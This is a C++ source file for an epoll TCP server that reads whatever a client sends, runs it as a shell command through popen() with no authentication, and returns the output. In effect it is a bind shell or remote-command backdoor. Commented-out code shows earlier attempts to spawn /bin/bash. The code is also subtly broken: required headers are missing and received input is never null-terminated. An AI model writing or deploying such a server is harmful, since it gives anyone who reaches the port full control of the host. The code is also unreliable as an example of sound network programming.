#include <sys/epoll.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <cstdlib>
#include <unistd.h>
#include <cstring>
#include <string>
#include <cstdio>
#include <vector>
#include <iostream>
#include <thread>

const static int MAX=1024;

struct epoll_tr
{
    int epoll_fd, nfds;
    epoll_event ev;
    epoll_event evlist[MAX];
};

struct sock_tr
{
    int socket_fd, connected_fd;
    sockaddr_in ssin, csin;
    socklen_t socklen = sizeof(sockaddr);
};

void err(int ret, const char str[])
{
    if(ret==-1)
    {
        std::perror(str);
        exit(1);
    }
}
std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}
//void data_pr(sock_tr* s, char* buf, const int len)
//{
//    int fd_p[2];
//    pipe(fd_p);
//    if(fork()==0)
//    {
//        close(fd_p[1]);
//
//        //read(fd_p[0], &buf, strlen(buf));
//    }
//    else
//    {
//        close(fd_p[0]);
//        execl("/bin/bash", );
//        //write(fd_p[1], &buf, strlen(buf));
//    }


/*   char buf1[BUFSIZ];
    FILE *f;
    buf[len-1] = '\0';
    buf[len-2] = '\0';
    f = popen(buf, "r");
    int num=1;
    while(num>0)
    {
        num=fread(buf1, 1, 1024, f);
        send(s->connected_fd, buf1, num, 0);
    }
    std::memset(buf1,0,1024);
    buf[len] = '\0';
    write(s->connected_fd, ">>", 2);
    pclose(f);
*/
//}

int main(int argc, char *argv[])
{
    int buflen;
    char buf[BUFSIZ];
    epoll_tr str;
    sock_tr sock;

    if (argc != 2)
    {
        std::cout<<"usage: "<<argv[0]<<" [port]"<<"\n";
        exit(1);
    }
    memset(&sock.ssin, 0, sock.socklen);
    sock.ssin.sin_family = AF_INET;
    sock.ssin.sin_port = htons(std::atoi(argv[1]));
    sock.ssin.sin_addr.s_addr = htonl(INADDR_ANY);

    sock.socket_fd = socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK, 0);
    err(sock.socket_fd, "socket");
    err((bind(sock.socket_fd, (struct sockaddr *)&sock.ssin,
              sock.socklen)), "bind");
    err((listen(sock.socket_fd, 5)), "listen");

    str.epoll_fd = epoll_create1(0);
    err(str.epoll_fd, "epoll_create1");
    str.ev.events = EPOLLIN;
    str.ev.data.fd = sock.socket_fd;
    err((epoll_ctl(str.epoll_fd, EPOLL_CTL_ADD,
                   sock.socket_fd, &str.ev)), "epoll_ctl1");
    for (;;)
    {
        str.nfds = epoll_wait(str.epoll_fd, str.evlist, MAX, -1);
        err(str.nfds, "epoll_wait");
        for (int i = 0; i < str.nfds; i++)
        {
            if (str.evlist[i].data.fd == sock.socket_fd)
            {
                sock.connected_fd = accept(sock.socket_fd,
                                           (struct sockaddr *)&sock.csin, &sock.socklen);
                err(sock.connected_fd, "accept");
                std::cout<<"accept"<<"\n";


                //write(sock.connect_fd, ">>", 2);
                str.ev.events = EPOLLIN;
                str.ev.data.fd = sock.connected_fd;
                err((epoll_ctl(str.epoll_fd, EPOLL_CTL_ADD,
                               sock.connected_fd, &str.ev)),"epoll_ctl2");
            }
            else if (str.evlist[i].data.fd == sock.connected_fd)
            {
                sock.connected_fd = str.evlist[i].data.fd;
                buflen = read(sock.connected_fd, buf, BUFSIZ-1);
                if (buflen <= 0)
                {
                    err((epoll_ctl(str.epoll_fd, EPOLL_CTL_DEL,
                                   sock.connected_fd, &str.evlist[i])),"epoll_ctl3");
                    close(sock.connected_fd);
                    err(sock.connected_fd, "close");
                    std::cout<<"close"<<"\n";

                }
                else {
                    //data_pr(&sock, buf, buflen);
                    std::string ans = exec(buf);
                    std::cout << ans<<std::endl;
                    ::send(sock.connected_fd,ans.c_str(),ans.size(),0);
                }

            }
        }
    }
}
